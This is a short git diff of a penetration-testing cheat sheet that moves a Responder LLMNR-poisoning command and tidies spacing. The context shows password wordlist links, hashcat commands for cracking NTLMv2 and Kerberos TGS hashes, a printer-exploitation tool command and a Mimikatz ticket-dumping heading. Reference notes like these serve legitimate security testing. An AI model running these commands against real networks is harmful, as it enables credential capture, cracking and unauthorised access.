@@ -32,7 +32,11 @@ https://download.g0tmi1k.com/wordlists/large/36.4GB-18_in_1.lst.7z (48.4 GB)
 https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
 
 # VEV
-
+## Responder
+### Kickstart responder
+```bash
+responder -I eth0 -v
+```
 ## Nmap
 #### Scan for Version, OS-type and all open ports to a file
 ```bash
@@ -83,11 +87,7 @@ pret.py target {ps,pjl,pcl}
 ```
 ## Zero Logon
 * in the making 
-## Responder
-### Kickstart responder
-```bash
-responder -I eth0 -v
-```
+
 ### Crack NTLMv2 hashes
 ```bash
 hashcat64.exe -m 5600 ntlm-hashes.txt <passlist.txt> -o cracked.txt
@@ -96,8 +96,6 @@ hashcat64.exe -m 5600 ntlm-hashes.txt <passlist.txt> -o cracked.txt
 ```bash
 hashcat64.exe -m 13100 krb5tgs-hashes.txt <passlist.txt> -o cracked.txt
 ```
-
-
 ## Mimikatz
 ### Dump tickets
 ```bash
